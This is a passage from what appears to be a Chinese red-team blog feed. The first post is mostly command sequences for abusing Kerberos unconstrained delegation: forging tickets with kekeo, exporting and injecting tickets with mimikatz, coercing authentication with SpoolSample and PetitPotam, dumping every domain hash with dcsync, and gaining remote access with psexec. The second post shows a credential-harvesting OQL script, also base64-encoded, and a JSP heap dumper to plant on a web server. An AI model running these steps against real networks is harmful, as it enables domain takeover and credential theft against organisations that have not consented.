class="line"></span><br><span class="line"># 查找非约束服务账户</span><br><span class="line">.\SharpView.exe <span class="keyword">Get</span>-NetUser -<span class="keyword">Filter</span> "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -DomainController AD01<span class="number">-2016</span></span><br></pre></td></tr></table></figure><h2 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h2><h3 id="服务账户"><a href="#服务账户" class="headerlink" title="服务账户"></a>服务账户</h3><h4 id="方法1：构造服务账户票据"><a href="#方法1：构造服务账户票据" class="headerlink" title="方法1：构造服务账户票据"></a>方法1：构造服务账户票据</h4><p>利用条件：</p><ol><li>服务账户设置了非约束性委派</li><li>已知服务账户的密码口令信息</li></ol><p>这里已知mssqlsrv服务账户密码password，并且ken设置了非约束性委派<br>    使用<a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">kekeo</a>工具进行操作：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造服务账户ken的票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"tgt::ask /user:saulgoodman /domain:redteam.com /password:Saul!@#456 /ticket:saulgoodman.kirbi"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用刚才伪造的ken票据，向域服务器申请CIFS服务票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"Tgs::s4u /tgt:TGT_saulgoodman@REDTEAM.COM_krbtgt~redteam.com@REDTEAM.COM.kirbi /user:administrator@redteam.com /service:cifs/AD01-2016.redteam.com"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用mimikatz将该票据注入当前的会话中，</span></span><br><span class="line">.\mimikatz.exe <span class="string">"kerberos::ptt TGS_administrator@redteam.com@REDTEAM.COM_saulgoodman@REDTEAM.COM.kirbi"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问目标共享盘</span></span><br><span class="line">dir \\ad01<span class="literal">-2016</span>\C<span class="variable">$</span></span><br></pre></td></tr></table></figure><h3 id="机器账户"><a href="#机器账户" class="headerlink" title="机器账户"></a>机器账户</h3><h4 id="方法1：诱使域管理员访问机器"><a href="#方法1：诱使域管理员访问机器" class="headerlink" title="方法1：诱使域管理员访问机器"></a>方法1：诱使域管理员访问机器</h4><blockquote><p>偏理想化，不实用</p></blockquote><p>当域管理员使用net use等远程访问命令，模拟域控管理员访问WIN7主机，设置了非约束性委派的主机可以抓取到域控管理员的TGT。<br>利用条件：</p><ol><li>需要Administrator权限</li><li>域内主机的机器账户开启非约束委派</li><li>域控管理员远程访问</li></ol><p>假设域控管理员执行：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 域控用户访问域内主机</span><br><span class="line"><span class="keyword">net</span> <span class="keyword">use</span> \\WIN10-1.redteam.<span class="keyword">lab</span></span><br></pre></td></tr></table></figure><p>导出票据，执行攻击</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 域内主机导出票据</span></span><br><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::tickets /export"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 查看票据</span></span><br><span class="line">mimikatz.exe <span class="string">"kerberos::list"</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 清空票据，可以使用绝对路径</span></span><br><span class="line">kerberos::purge [ticket]</span><br></pre></td></tr></table></figure><p><img src="5.png" alt="image.png"></p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 导入内存</span></span><br><span class="line">mimikatz.exe <span class="string">"kerberos::ptt [0;cfd6c]-2-0-60a10000-Administrator@krbtgt-REDTEAM.LAB.kirbi"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 访问目标盘</span></span><br><span class="line">dir \\DC2016.redteam.lab\c$</span><br></pre></td></tr></table></figure><p><img src="6.png" alt="image.png"></p><h4 id="方法2：结合打印机漏洞（SpoolSample）"><a href="#方法2：结合打印机漏洞（SpoolSample）" class="headerlink" title="方法2：结合打印机漏洞（SpoolSample）"></a>方法2：结合打印机漏洞（SpoolSample）</h4><p>强迫运行打印服务（Print Spooler）的主机向目标主机发起 Kerberos 或 NTLM 认证请求。<br>利用条件：</p><ol><li>需要Administrator权限</li><li>需要2012 R2以上，2012 r2以下版本不在rpc中暴露Spooler服务</li></ol><p>利用过程：<br>使用<a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">Rubeus</a>工具监听</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询打印服务是否开启|域控上查看</span></span><br><span class="line">sc query spooler</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用Rubeus监听来自域控的票据,1秒一次</span></span><br><span class="line">Rubeus.exe<span class="built_in"> monitor </span>/interval:1 /filteruser:ad01-2016$</span><br></pre></td></tr></table></figure><p><img src="7.png" alt="image.png"><br>使用<a href="https://github.com/leechristensen/SpoolSample" target="_blank" rel="noopener">SpoolSample</a>工具执行打印机漏洞利用，进行强制验证</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 强制回连，获得域控机器账户的TGT</span><br><span class="line">SpoolSample.<span class="keyword">exe</span> ad01-<span class="number">2016</span> web-<span class="number">2012</span></span><br><span class="line"></span><br><span class="line">## 域外工具</span><br><span class="line"><span class="keyword">python</span> dementor.<span class="keyword">py</span> -d domain -<span class="keyword">u</span> username -<span class="keyword">p</span> password 回连ip 目标ip</span><br><span class="line"><span class="keyword">python3</span> printerbug.<span class="keyword">py</span> redteam.<span class="keyword">com</span>/admin:<span class="string">"Aa123456"</span>@<span class="number">192.168</span>.<span class="number">10.250</span>  回连主机</span><br></pre></td></tr></table></figure><p><img src="8.png" alt="image.png"><br>Rubeus监听到票据并导入该票据</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rubeus导入票据</span></span><br><span class="line">Rubeus.exe ptt <span class="regexp">/ticket:doIFGjCCBRagAwIBBaEDAgEWooIEIzCCBB9hggQbMIIEF6ADAgEFoQ0bC1JFRFRFQU0uTEFCoiAwHqADAgECoRcwFRsGa3JidGd0GwtSRURURUFNLkxBQqOCA90wggPZoAMCARKhAwIBAqKCA8sEggPHdOzGGhqNLMiflfgJCrXq6OzfDy1u+wHM8mdH8IpkVEbl+TX5liKAPQ/i</span>4nIewzu9yq8kO9tEZYRhARky6B2Bw4RWD6tx9nytF24Q6AhvpzIfxAK2zJ1fLX5AtH9yyqbVVdd+ryoR8PjUCl09IdyfdmTfMW45olQhHVMG1l2Oz9agg8tUANOFT9HjbxrDJjgCvFMEJ7hJ3s1dsYORZfvXk31J4fn3VRLHj<span class="regexp">/5N9XpQQ5n8T24p8KGmvfK/</span>SdPDU4im<span class="regexp">/Jud5syF60l1sMH/</span>UUr4UYaHSAFM3ui1sgaeO45MdPq7hAVVRaBX8WjogadUTeRghh47nH4aAsbAqxmmCNkTKkYSAPdc8fKIAFQNSONpEsBnaCrLo+QoD<span class="regexp">/x+VIkNHbPYA7Zt3kb/</span>neoH65zP5PTm95pAjmnx7P56<span class="regexp">/UdwgxkVTd7KHsj4VQ/</span><span class="number">7</span>BsHx8GfpXKcmev08KSGvMvXM6+zr9XbrnLne6bnabNTUHuqfh6+<span class="number">4</span>qImMlig6RMmeSpJa0hFAzJdhzkZGO9LLL2OZSOME2ngSvffCunaNqdIGEbev8i5kVMhwg4upv9tClWW+h0mEJWeZ332WF2LKI2VEKjQePAbkM3UUmr+<span class="number">1</span>vUXKEcKPEqQ58fQH2+Nr4naONswOTVb1CLdXB7<span class="regexp">/SdfCcYU26Pgm7vQnl2uNb6LhlpPYAXGoaofUjRV0d3JIR+2oXSt5ia5auCyhU6/</span>nKXPP1KBCiQzjRACSOyeRivxTaxVZExbtLNi932psyMOKCb6qE<span class="regexp">/JHyhve5Iu/</span>nBp78RcfjoTrNaqUCO<span class="regexp">/ZxA2AUlUEpcmoU+Vmm+fQEb828EZtKFoyxKPBKtbK/</span>jLsgk8qEoy5JwIEmMIeIP0D95vc+Rzp5A<span class="regexp">/WSiN0yn9RXqd8On/</span>UBjOW7O42uKhrVJrJ5ClOu+HdHN2WkejBkslnBJYSaL+A69eA5qb+yAJhJqmlSFupfGhQhzm<span class="regexp">/YNDdcifKU+47R3WF3n9OvSqQgLush9/</span>hkGPgwVLp1Wj6LQHzofIujVRDOybAeNt+lATwzQGVHpeUOWy<span class="regexp">/iXV/</span>UxTPGT3VBiPpIm1E813QKw8eWTxLm5YeQJrk0Uyj<span class="regexp">/qalqqo5gskI0fY7Sq60pMA9t1TA6nrdmcQzesKWAcf6QmEmQorTcPw4znaM5QSKAGwRQRGGt57RADimgrs/</span>R2K3Rqa3C<span class="regexp">/ePlSgaPJN3jS5AGHF9j1/</span>MJE0Eb8ZwPXTI0P77NCDWthqK7wFzcyKkrpNjodMf<span class="regexp">/KFs96wkVqWBJ0Xy5qza9rFy/</span>r79WZtICfxLfbdF8KGrS5LCCIYKMVhPq56OB4jCB36ADAgEAooHXBIHUfYHRMIHOoIHLMIHIMIHFoCswKaADAgESoSIEIP6GQ<span class="regexp">/T97TyQDQUyz2ZnOBxcZEcgQ0iexOoMgGUOzdNUoQ0bC1JFRFRFQU0uTEFCohQwEqADAgEBoQswCRsHREMyMDE2JKMHAwUAYKEAAKURGA8yMDIyMDUxODA3NDcxMFqmERgPMjAyMjA1MTgxNzQ3MTBapxEYDzIwMjIwNTI1MDc0NzEwWqgNGwtSRURURUFNLkxBQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLUkVEVEVBTS5MQUI=</span></span><br></pre></td></tr></table></figure><p><img src="9.png" alt="image.png"></p><p>使用<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">mimikatz</a>导出Hash</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mimikatz导出域内用户Hash</span></span><br><span class="line">.<span class="string">\mimikatz.exe</span> <span class="string">"lsadump::dcsync /domain:redteam.com /all /csv"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure><p><img src="10.png" alt="image.png"></p><p>使用psexec远程登录：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\<span class="selector-tag">psexec</span><span class="selector-class">.exe</span> <span class="selector-tag">-dc-ip</span> 10<span class="selector-class">.10</span><span class="selector-class">.10</span><span class="selector-class">.10</span> <span class="selector-tag">ad01-2016</span><span class="selector-class">.redteam</span><span class="selector-class">.com</span> <span class="selector-tag">-no-pass</span> <span class="selector-tag">-k</span> <span class="selector-tag">-codec</span> <span class="selector-tag">gbk</span></span><br></pre></td></tr></table></figure><h4 id="方法3：PetitPotam-MS-EFSRPC远程文件加密协议漏洞强制域请求"><a href="#方法3：PetitPotam-MS-EFSRPC远程文件加密协议漏洞强制域请求" class="headerlink" title="方法3：PetitPotam MS-EFSRPC远程文件加密协议漏洞强制域请求"></a>方法3：PetitPotam MS-EFSRPC远程文件加密协议漏洞强制域请求</h4><blockquote><p>利用EFSRPC（加密文件系统远程协议）进行中继攻击的漏洞（PetitPotam）,CVE-2021-36942</p></blockquote><p>利用条件：</p><ol><li>需要Administrator权限</li><li>需要Service系统或Service服务用户</li><li>2008-2012可匿名触发，2016及以上版本需要域内凭证<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Rubeus监听来自域控的票据,1秒一次</span></span><br><span class="line">Rubeus.exe<span class="built_in"> monitor </span>/interval:1 /filteruser:ad01-2016$</span><br></pre></td></tr></table></figure><img src="11.png" alt="image.png"></li></ol><p><a href="https://github.com/topotam/PetitPotam.git" target="_blank" rel="noopener">https://github.com/topotam/PetitPotam.git</a></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">## Windows Server <span class="number">2008</span> <span class="number">2012</span>域内攻击方法</span><br><span class="line">PetitPotam.exe web<span class="number">-2012.</span>redteam.com <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Windows Server2016 或 域外攻击方法</span><br><span class="line">python3  PetitPotam.py -d redteam.com -u susan -p asd123= web<span class="number">-2012.</span>redteam.com <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span></span><br></pre></td></tr></table></figure><p><img src="12.png" alt="image.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/seanzed/article/details/77619985" target="_blank" rel="noopener">AD用户属性userAccountControl的详细解释</a><br><a href="https://forum.butian.net/index.php/share/1591" target="_blank" rel="noopener">红队域渗透技术：委派攻击汇总（全）</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;非约束性委派(Unconstrained Delegation)，服务账号可以获取某用户的 TGT，从而服务账号可使用该 TGT，模拟用户&lt;strong&gt;访问任意服务。&lt;/strong&gt;&lt;br&gt;如果某个服务 A 的服务账号 B 被设置为非约束委派，当用户 C 通过 Kerberos 认证访问服务 A 时，KDC 会检查服务账号 B 的属性，发现是非约束性委派时，KDC 会将用户 C 的 TGT 放在 TGS 中，这样 B 在验证 TGS 的同时获取了 A 用户的 TGT，从而可以模拟用户 A 访问&lt;code&gt;任意&lt;/code&gt;服务。&lt;/p&gt;</summary>
    
    
    
    <category term="委派" scheme="https://chenzidu.github.io/categories/%E5%A7%94%E6%B4%BE/"/>
    
    
    <category term="Windows" scheme="https://chenzidu.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Java 导出内存查找敏感信息</title>
    <link href="https://chenzidu.github.io/2023/01/04/Java-%E5%AF%BC%E5%87%BA%E5%86%85%E5%AD%98%E6%9F%A5%E6%89%BE%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/"/>
    <id>https://chenzidu.github.io/2023/01/04/Java-%E5%AF%BC%E5%87%BA%E5%86%85%E5%AD%98%E6%9F%A5%E6%89%BE%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/</id>
    <published>2023-01-04T08:23:48.000Z</published>
    <updated>2023-01-04T08:27:16.283Z</updated>
    
    <content type="html"><![CDATA[<p>如果重要的数据（保存在内存中）在使用后没有及时清理，有可能会导致信息泄漏。开发人员通常都回用String 保存敏感数据（密码，卡号等）。因为String 对象是不可变的，只有 JVM 的垃圾回收器才能从内存中清除String的值。而只有内存不足的时候虚拟机才会执行垃圾回收，所以我们不能保证垃圾回收什么时候进行。当系统崩溃后，memory dump 可能会泄漏敏感数据。</p><a id="more"></a><h2 id="1、获取JVMHeapDump"><a href="#1、获取JVMHeapDump" class="headerlink" title="1、获取JVMHeapDump"></a>1、获取JVMHeapDump</h2><blockquote><p><strong>内存转储执行的过程中为了保证dump的信息是可靠的，所以会暂停应用</strong>， <strong>线上系统慎用</strong>。<br>JVM会将整个heap的信息dump写入到一个文件，heap如果比较大的话，就会导致这个过程比较耗时，如果要转储千兆字节大小的堆，则暂停时间以<strong>分钟</strong>而不是<strong>秒</strong>为单位。</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#jmap，jcmd 都是JDK自带工具，指定JVM pid 直接dump</span></span><br><span class="line">jcmd <span class="number">5760</span>[PID] GC.heap_dump <span class="regexp">/tmp/</span>dumpHeap.hprof</span><br><span class="line">此转储过程比使用jmap进行转储要快得多！转储文件要小得多，但足以让您知道泄漏的位置。</span><br></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;jmap -<span class="keyword">dump</span>:live,format=b,<span class="keyword">file</span>=<span class="regexp">/tmp/</span>dumpHeap.hprof <span class="number">5760</span>  #live Object</span><br><span class="line"></span><br><span class="line">&gt;jmap -<span class="keyword">dump</span>:format=b,<span class="keyword">file</span>=<span class="regexp">/tmp/</span>dumpHeap.hprof <span class="number">19770</span>  # all Object 不建议</span><br><span class="line">如果使用<span class="string">"-dump"</span>，则将转储整个堆，包括不可达的对象。如果使用<span class="string">"-dump:live"</span>，则只会转储可访问的对象，但这（至少）需要标记堆以找出可访问的对象。</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/2118454/1672820322869-0e9aff63-b7e7-4f96-98be-3ae1f31a5010.png#averageHue=%232d2c2a&clientId=u8f4a23e9-4595-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=211&id=uea618b0d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=316&originWidth=958&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89994&status=done&style=none&taskId=ueebb3af7-f629-4c53-be13-0e6184c95c8&title=&width=638.6666666666666" alt="image.png"></p><h2 id="2、工具"><a href="#2、工具" class="headerlink" title="2、工具"></a>2、工具</h2><h3 id="JavaPassDump"><a href="#JavaPassDump" class="headerlink" title="JavaPassDump"></a>JavaPassDump</h3><p>工具：<a href="https://github.com/corener/JavaPassDump" target="_blank" rel="noopener">https://github.com/corener/JavaPassDump</a></p><blockquote><p>所有在Java层的数据库连接，最终都会维持一个DB Driver Object，其中会保留数据库的连接配置。<br>思路一：基于经验的，匹配所有DB Driver，从内存中找到Driver Object，获取username/password字段 ；<br>思路二：绝大部分的配置信息，在内存中，都是String类型的field字段，直接从内存中提取password字段的field值。两种思路的前提都是能够分析内存，尝试直接分析运行时内存，从中提取配置信息，无奈坑点太多，遂转入dump JVMHeap，直接通过OQL语言进行分析。<br>实战中，DumpJVNHeap大小从几M～几G左右不等，拉到本地分析不太现实，直接在线上分析拿到分析结果就行。这样，在流量层面，效率方面，更优化。为了更简单通用，采用思路二，直接提取password字段的值。</p></blockquote><p>根据线上JDK环境，适配对应的jar，</p><ul><li>OQLQuery7-.jar 适配JDK&lt;=7 </li><li>OQLQuery8+.jar 适配JDK&gt;=8 </li></ul><p>除了线上环境，OQLQuery.jar也可以用在本地分析JvmHeapDump.hprof文件，例如：Spring的/heapdump接口，产生的dump文件，利用对应的OQL语句，也可以提取出密码参数 。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">## 放置于webServer的web路径下，访问时，dump当前JVM的heap到/tmp目录，windows系统，需要修改路径</span></span><br><span class="line"><span class="attr">&gt;heapDump.jsp </span></span><br><span class="line"><span class="attr"></span></span><br><span class="line"><span class="attr">## 分析JVMHeap文件 结尾为oql语句 base64</span>编码</span><br><span class="line">java -jar ./OQLQuery.jar /tmp/dumpHeap.hprof dmFyIGZpbHRlciA<span class="number">9</span>IHt<span class="number">9</span>OwptYXAoaGVhcC<span class="number">5</span>jbGFzc<span class="number">2</span>VzKCksIGZ<span class="number">1</span>bm<span class="symbol">N0</span>aW<span class="number">9</span>uIChjbHMpIHsKICAgcmV<span class="number">0</span>dXJuI<span class="name">G1</span>hcChjbHMuZmllbGRzLCBmdW<span class="number">5</span>jdGlvbiAoZmllbGQpIHsgCiAgICAgIGlmKCBmaW<span class="attr">VsZC5</span>uYW<span class="number">1</span>lL<span class="symbol">nRvU3</span>RyaW<span class="number">5</span><span class="symbol">nKCkuY29</span>udGFpb<span class="symbol">nMoInBhc3</span>MiKSB<span class="number">8</span>fCBmaW<span class="attr">VsZC5</span>uYW<span class="number">1</span>lL<span class="symbol">nRvU3</span>RyaW<span class="number">5</span><span class="symbol">nKCkuY29</span>udGFpb<span class="symbol">nMoInVzZXJuYW1</span>lIikgfHxmaW<span class="attr">VsZC5</span>uYW<span class="number">1</span>lL<span class="symbol">nRvU3</span>RyaW<span class="number">5</span><span class="symbol">nKCkuY29</span>udGFpb<span class="symbol">nMoIlBBU1</span>MiKSl<span class="number">7</span>CiAgICAgICAgcmV<span class="number">0</span>dXJuI<span class="name">G1</span>hcChoZWFwL<span class="name">m9</span>iamVjdHMoY<span class="number">2</span>xzKSwgZ<span class="symbol">nVuY3</span>Rpb<span class="number">24</span>gK<span class="name">G9</span>icykgewogICAgICAgICAgdmFyIHRhZyA<span class="number">9</span>IG<span class="symbol">Nscy5</span>uYW<span class="number">1</span>lKyJ<span class="number">8</span>IitmaW<span class="attr">VsZC5</span>uYW<span class="number">1</span>lIDsKICAgICAgICAgIHZhciByZXMgPSAgIm<span class="symbol">NsYXNzIDogIitjbHMubmFtZSsiXG4</span>gRmllbGQgWyAiK<span class="number">2</span>ZpZWxkL<span class="name">m5</span>hbWUud<span class="name">G9</span>TdHJpbmcoKSsiIDogIjsKICAgICAgICAgIGlmKCBvY<span class="symbol">nNbZmllbGQubmFtZS50</span>b<span class="number">1</span><span class="symbol">N0</span>cmluZygpXSAhPSBudWxsICl<span class="number">7</span>CiAgICAgICAgICAgIHJlcyA<span class="number">9</span>IHJlcyArI<span class="name">G9</span>ic<span class="number">1</span>tmaW<span class="attr">VsZC5</span>uYW<span class="number">1</span>lL<span class="symbol">nRvU3</span>RyaW<span class="number">5</span><span class="symbol">nKCldLnRvU3</span>RyaW<span class="number">5</span><span class="symbol">nKCkrIiBdXG4</span>iOwogICAgICAgICAgfW<span class="attr">Vsc2</span>V<span class="number">7</span>CiAgICAgICAgICAgIHJlcyA<span class="number">9</span>IHJlcyArICJudWxsIF<span class="number">1</span>cbiI<span class="number">7</span>CiAgICAgICAgICB<span class="number">9</span>CiAgICAgICAgICBpZiAoZmlsdGVyW<span class="number">3</span>RhZ<span class="number">10</span>gPT<span class="number">0</span>gb<span class="symbol">nVsbCkgewogICAgICAgICAgICBmaWx0</span>ZXJbdGF<span class="symbol">nXSA9</span>IHJlczsKICAgICAgICAgICAgcHJpb<span class="symbol">nQocmVzKTsKICAgICAgICAgIH0</span>KICAgICAgICAgIHJldHVybiBudWxsOwogICAgICAgIH<span class="number">0</span>pOwogICAgICB<span class="number">9</span>CiAgICAgIHJldHVybiBudWxsOwogIH<span class="number">0</span>pOwp<span class="number">9</span>KTs=</span><br></pre></td></tr></table></figure><p>oql语句</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var<span class="built_in"> filter</span> = &#123;&#125;;</span><br><span class="line"><span class="keyword">map</span>(heap.classes(), <span class="keyword">function</span> (cls) &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">map</span>(cls.fields, <span class="keyword">function</span> (field) &#123; </span><br><span class="line">      <span class="keyword">if</span>( field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"pass"</span>) || field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"username"</span>) ||field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"PASS"</span>)||field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"key"</span>)||field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"KEY"</span>)||field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"key"</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">map</span>(heap.objects(cls), <span class="keyword">function</span> (obs) &#123;</span><br><span class="line">          var tag = cls<span class="built_in">.name</span>+<span class="string">"|"</span>+field<span class="built_in">.name</span> ;</span><br><span class="line">          var res =  <span class="string">"class : "</span>+cls<span class="built_in">.name</span>+<span class="string">"\n Field [ "</span>+field<span class="built_in">.name</span>.toString()+<span class="string">" : "</span>;</span><br><span class="line">          <span class="keyword">if</span>( obs[field<span class="built_in">.name</span>.toString()] != null )&#123;</span><br><span class="line">            res = res + obs[field<span class="built_in">.name</span>.toString()].toString()+<span class="string">" ]\n"</span>;</span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res = res + <span class="string">"null ]\n"</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> <span class="built_in">(filter</span>[tag] == null) &#123;</span><br><span class="line">           <span class="built_in"> filter</span>[tag] = res;</span><br><span class="line">            print(res);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> null;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> null;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dmFyIGZpbHRlciA9IHt9OwptYXAoaGVhcC5jbGFzc2VzKCksIGZ1bmN0aW9uIChjbHMpIHsKICAgcmV0dXJuIG1hcChjbHMuZmllbGRzLCBmdW5jdGlvbiAoZmllbGQpIHsgCiAgICAgIGlmKCBmaWVsZC5uYW1lLnRvU3RyaW5nKCkuY29udGFpbnMoInBhc3MiKSB8fCBmaWVsZC5uYW1lLnRvU3RyaW5nKCkuY29udGFpbnMoInVzZXJuYW1lIikgfHxmaWVsZC5uYW1lLnRvU3RyaW5nKCkuY29udGFpbnMoIlBBU1MiKXx8ZmllbGQubmFtZS50b1N0cmluZygpLmNvbnRhaW5zKCJrZXkiKXx8ZmllbGQubmFtZS50b1N0cmluZygpLmNvbnRhaW5zKCJLRVkiKXx8ZmllbGQubmFtZS50b1N0cmluZygpLmNvbnRhaW5zKCJrZXkiKSl7CiAgICAgICAgcmV0dXJuIG1hcChoZWFwLm9iamVjdHMoY2xzKSwgZnVuY3Rpb24gKG9icykgewogICAgICAgICAgdmFyIHRhZyA9IGNscy5uYW1lKyJ8IitmaWVsZC5uYW1lIDsKICAgICAgICAgIHZhciByZXMgPSAgImNsYXNzIDogIitjbHMubmFtZSsiXG4gRmllbGQgWyAiK2ZpZWxkLm5hbWUudG9TdHJpbmcoKSsiIDogIjsKICAgICAgICAgIGlmKCBvYnNbZmllbGQubmFtZS50b1N0cmluZygpXSAhPSBudWxsICl7CiAgICAgICAgICAgIHJlcyA9IHJlcyArIG9ic1tmaWVsZC5uYW1lLnRvU3RyaW5nKCldLnRvU3RyaW5nKCkrIiBdXG4iOwogICAgICAgICAgfWVsc2V7CiAgICAgICAgICAgIHJlcyA9IHJlcyArICJudWxsIF1cbiI7CiAgICAgICAgICB9CiAgICAgICAgICBpZiAoZmlsdGVyW3RhZ10gPT0gbnVsbCkgewogICAgICAgICAgICBmaWx0ZXJbdGFnXSA9IHJlczsKICAgICAgICAgICAgcHJpbnQocmVzKTsKICAgICAgICAgIH0KICAgICAgICAgIHJldHVybiBudWxsOwogICAgICAgIH0pOwogICAgICB9CiAgICAgIHJldHVybiBudWxsOwogIH0pOwp9KTs=</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/2118454/1672728774252-a0b92579-19ca-47f0-b3ba-4824bc41fbc8.png#averageHue=%232e2f37&clientId=u53581134-91f7-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=333&id=u29a48a59&margin=%5Bobject%20Object%5D&name=image.png&originHeight=500&originWidth=903&originalType=binary&ratio=1&rotation=0&showTitle=false&size=283298&status=done&style=none&taskId=u9c90d513-8459-4b04-9dde-81b011b5551&title=&width=602" alt="image.png"></p><h3 id="heapdump-tool"><a href="#heapdump-tool" class="headerlink" title="heapdump_tool"></a>heapdump_tool</h3><blockquote><p>该工具是基于jhat，通过jhat解析heapdump文件，所以需要安装jdk和配置好环境变量，例如win \Java\jdk8\bin\jhat.exe，  在控制台输入jhat检查是否安装正确。</p></blockquote><p><a 